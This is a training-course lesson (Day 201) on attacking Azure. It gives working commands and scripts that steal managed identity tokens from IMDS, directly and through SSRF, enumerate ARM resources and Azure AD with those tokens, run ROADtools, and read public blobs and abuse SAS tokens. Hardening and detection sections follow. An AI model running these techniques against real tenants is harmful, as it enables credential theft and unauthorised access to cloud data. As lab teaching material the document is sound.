---
title: "Cloud Practice — Azure Attack Surface"
tags: [cloud-practice, Azure, managed-identity, IMDS, Blob, AAD, ROADtools,
       Graph-API, SAS-token, service-principal, privilege-escalation, lab]
module: 04-BroadSurface-02
day: 201
related_topics:
  - Azure for Attackers (Day 189)
  - Cloud Full Attack Lab (Day 192)
  - Cloud Security Review (Day 196)
  - Milestone 200 Days (Day 200)
---

# Day 201 — Cloud Practice: Azure

> "Azure has the same attack patterns as AWS but different service names and
> different tools. The metadata is still at 169.254.169.254 — same IP, different
> required header. The IAM equivalent is Azure AD. The S3 equivalent is Blob
> storage. The Pacu equivalent is ROADtools. Once you know the pattern, you just
> learn the vocabulary. Today you learn the Azure vocabulary well enough that you
> do not have to look it up under pressure."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Extract managed identity tokens via SSRF to the Azure IMDS endpoint.
2. Use a token to enumerate Azure Resource Manager resources.
3. Use a Microsoft Graph API token to enumerate AAD users, groups, and apps.
4. Test Azure Blob storage for public access and SAS token abuse.
5. Enumerate AAD service principals and find overpermissioned app registrations.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Azure for Attackers | Day 189 |
| Cloud Full Attack Lab | Day 192 |
| Azure CLI | `pip install azure-cli` |
| ROADtools | `pip install roadtools` |

---

## Setup: Azure Test Environment

For this practice, use one of:
- **Azure free account** (valid student/personal account) — run against your
  own subscription; do not test against systems you do not own
- **CloudGoat Azure scenarios** (`github.com/RhinoSecurityLabs/cloudgoat`)
- **AzureGoat** (`github.com/ine-labs/AzureGoat`) — Azure-equivalent of DVWA

```bash
# Verify Azure CLI is set up
az account show
az account list --output table

# Set working subscription
SUBSCRIPTION_ID=$(az account show --query id -o tsv)
TENANT_ID=$(az account show --query tenantId -o tsv)
echo "Subscription: $SUBSCRIPTION_ID"
echo "Tenant: $TENANT_ID"
```

---

## Block 1 — Azure IMDS Token Extraction (30 min)

### 1.1 — Direct IMDS (from inside an Azure VM)

If you have SSH access or RCE on an Azure VM:

```bash
# The key difference from AWS: Metadata: true header is required
# Without it, the request returns 400 Bad Request

# Step 1: Get managed identity token for ARM
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?\
api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Response:
# {
#   "access_token": "eyJ0eXAiOiJKV1Q...",
#   "expires_in": "86399",
#   "token_type": "Bearer",
#   "resource": "https://management.azure.com/"
# }

ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?\
api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "ARM token: ${ARM_TOKEN:0:50}..."

# Step 2: Get token for Microsoft Graph (different resource, same IMDS)
GRAPH_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?\
api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Graph token: ${GRAPH_TOKEN:0:50}..."
```

### 1.2 — SSRF to Azure IMDS (from a web application)

If you have SSRF in a web app running on Azure:

```python
# Test SSRF vector
import requests

SSRF_ENDPOINT = "https://target-app.azurewebsites.net/fetch"

# Test 1: Does SSRF work at all?
r = requests.get(SSRF_ENDPOINT, params={"url": "http://httpbin.org/ip"})
print("SSRF works:", r.status_code, r.text[:100])

# Test 2: Azure IMDS — note the Metadata: true header must be relayed
# The SSRF must forward custom headers for this to work
r = requests.get(
    SSRF_ENDPOINT,
    params={
        "url": "http://169.254.169.254/metadata/identity/oauth2/token"
              "?api-version=2018-02-01&resource=https://management.azure.com/",
        "headers": '{"Metadata": "true"}'   # if the SSRF endpoint accepts headers
    }
)
print(r.text[:200])

# If the SSRF does not relay custom headers, Azure IMDS is harder to exploit
# (This is the key difference from AWS IMDSv1 — the Metadata header requirement
# provides partial protection against simple SSRF without header control)
```

---

## Block 2 — ARM API Enumeration (30 min)

```bash
# With ARM token from Block 1
ARM_TOKEN="[token from Block 1]"

# List all resource groups
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups\
?api-version=2021-04-01" \
  | python3 -m json.tool | grep '"name"'

# List all resources in the subscription
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resources\
?api-version=2021-04-01" \
  | python3 -c "
import sys, json
resources = json.load(sys.stdin)['value']
for r in resources:
    print(r['type'].ljust(50), r['name'])
"

# List all storage accounts (Azure equivalent of S3 buckets)
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers\
/Microsoft.Storage/storageAccounts?api-version=2021-02-01" \
  | python3 -c "
import sys, json
accounts = json.load(sys.stdin)['value']
for a in accounts:
    print(a['name'], a['properties'].get('allowBlobPublicAccess', 'unknown'))
"

# Check role assignments (who has what access)
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID\
/providers/Microsoft.Authorization/roleAssignments\
?api-version=2022-04-01&\$filter=atScope()" \
  | python3 -m json.tool | grep -E '"principalId"|"roleDefinitionId"' | head -30
```

---

## Block 3 — Graph API Enumeration (30 min)

```bash
GRAPH_TOKEN="[token from Block 1]"

# List AAD users
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users" \
  | python3 -c "
import sys, json
users = json.load(sys.stdin)['value']
for u in users:
    print(u.get('displayName','').ljust(30), u.get('userPrincipalName',''))
"

# List all groups (find admin groups)
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups" \
  | python3 -c "
import sys, json
groups = json.load(sys.stdin)['value']
for g in groups:
    if any(kw in g.get('displayName','').lower()
           for kw in ['admin', 'global', 'security', 'privilege']):
        print('[INTERESTING]', g['displayName'], g['id'])
    else:
        print('               ', g['displayName'])
"

# List service principals (app registrations with credentials)
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals" \
  | python3 -c "
import sys, json
sps = json.load(sys.stdin)['value']
for sp in sps:
    # Look for SPs with credentials (client secrets or certificates)
    if sp.get('passwordCredentials') or sp.get('keyCredentials'):
        print('[HAS CREDS]', sp['displayName'], '-', sp.get('appId'))
"

# ROADtools for deeper AAD enumeration
roadrecon gather -t $TENANT_ID --access-token $GRAPH_TOKEN
roadrecon plugin policies
roadrecon plugin mfa
```

---

## Block 4 — Blob Storage Attacks (30 min)

```bash
# Find storage accounts from Block 2
STORAGE_ACCOUNT="labstorageaccount"

# Test for public blob containers
# Public containers respond with XML without authentication
curl -s "https://${STORAGE_ACCOUNT}.blob.core.windows.net/?comp=list" \
  | python3 -c "
import sys
import xml.etree.ElementTree as ET
root = ET.fromstring(sys.stdin.read())
for c in root.iter('Container'):
    name = c.find('Name').text
    access = c.find('.//PublicAccess')
    level = access.text if access is not None else 'private'
    print(f'{name}: {level}')
"

# List files in a public container
CONTAINER="public-assets"
curl -s "https://${STORAGE_ACCOUNT}.blob.core.windows.net/${CONTAINER}?\
restype=container&comp=list" \
  | python3 -c "
import sys
import xml.etree.ElementTree as ET
root = ET.fromstring(sys.stdin.read())
for blob in root.iter('Blob'):
    name = blob.find('Name').text
    size = blob.find('.//Content-Length').text if blob.find('.//Content-Length') is not None else '?'
    print(f'{name} ({size} bytes)')
"

# Download a file from a public container
curl -O "https://${STORAGE_ACCOUNT}.blob.core.windows.net/${CONTAINER}/sensitive-report.pdf"

# SAS token analysis
# If you find a SAS token in source code or HTTP requests:
SAS="sv=2021-06-08&ss=b&srt=sco&sp=rwdlacupiytfx&se=2025-12-31T00:00:00Z&..."
echo "SAS expiry: $(echo $SAS | grep -oP 'se=\K[^&]+')"
echo "Permissions: $(echo $SAS | grep -oP 'sp=\K[^&]+')"
# r=read, w=write, d=delete, l=list — rwdl means full access

# Use the SAS token to list and read
curl "https://${STORAGE_ACCOUNT}.blob.core.windows.net/${CONTAINER}?\
restype=container&comp=list&${SAS}"
```

---

## Block 5 — Hardening Check (15 min)

Verify the hardening controls for what you just exploited:

```bash
# 1. Check if Blob Public Access is disabled (correct state)
az storage account list \
  --query "[].{Name: name, PublicAccess: allowBlobPublicAccess}" \
  --output table

# Fix — disable public access at account level
az storage account update \
  --name $STORAGE_ACCOUNT \
  --allow-blob-public-access false

# 2. Check managed identity restrictions
az vm identity show --name [vm-name] --resource-group [rg-name]

# 3. Check what roles the managed identity has
PRINCIPAL_ID=$(az vm identity show \
  --name [vm-name] --resource-group [rg-name] \
  --query principalId -o tsv)

az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all \
  --query "[].{Role: roleDefinitionName, Scope: scope}" \
  --output table

# Overpermissioned: Contributor or Owner at subscription scope
# Correct: Custom role with only the specific permissions the VM needs
```

---

## Key Takeaways

1. **The `Metadata: true` header is Azure's partial protection against SSRF to IMDS.**
   If an SSRF endpoint does not relay arbitrary headers, the attack fails. This is
   meaningfully better than AWS IMDSv1, but attackers often find ways to control
   headers (via request injection, HTTP parameter pollution, or the SSRF endpoint's
   forwarding logic).
2. **One IMDS token cannot be used for both ARM and Graph.** The `resource`
   parameter scopes the token. An attacker needs two separate IMDS calls to
   enumerate both Azure resources and AAD.
3. **Blob public access is account-level in Azure too.** Setting
   `allowBlobPublicAccess: false` at the storage account level prevents any
   container in that account from being made public, even if someone tries.
4. **SAS tokens with long expiry and write permissions are high-severity findings.**
   `sp=rwdlacupiytfx` on an SAS token with `se=2030` is essentially permanent
   write access to the storage account. Cap expiry and scope permissions.
5. **ROADtools is the Azure equivalent of Pacu for AAD.** It enumerates users,
   groups, service principals, Conditional Access policies, and MFA status from
   any tenant where you have a Graph API token.

---

## Exercises

1. Write a Python script that takes an Azure ARM token and produces a formatted
   inventory of: (a) all resource groups, (b) all storage accounts and their
   public access setting, (c) all VMs and their managed identity principal IDs,
   (d) all role assignments for each managed identity.
2. Enumerate your own Azure test tenant with ROADtools. What are the most dangerous
   role assignments? What principals have `Owner` or `Contributor` at subscription
   scope?
3. Write a detection rule (Sigma or Azure Monitor KQL) for: a managed identity
   token being used from an IP outside Azure IP ranges. What Azure log source
   contains this event?
4. Research: Azure Conditional Access — how can a Conditional Access policy restrict
   managed identity token usage? Does it apply to managed identities at all?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q201.1, Q201.2 …).
> Follow-up questions use hierarchical numbering (Q201.1.1, Q201.1.2 …).

---

## Navigation

← Previous: [Day 200 — Milestone: 200 Days](DAY-0200-Milestone-200-Days-Cloud-Review.md)
→ Next: [Day 202 — Cloud Practice: GCP](DAY-0202-Cloud-Practice-GCP.md)
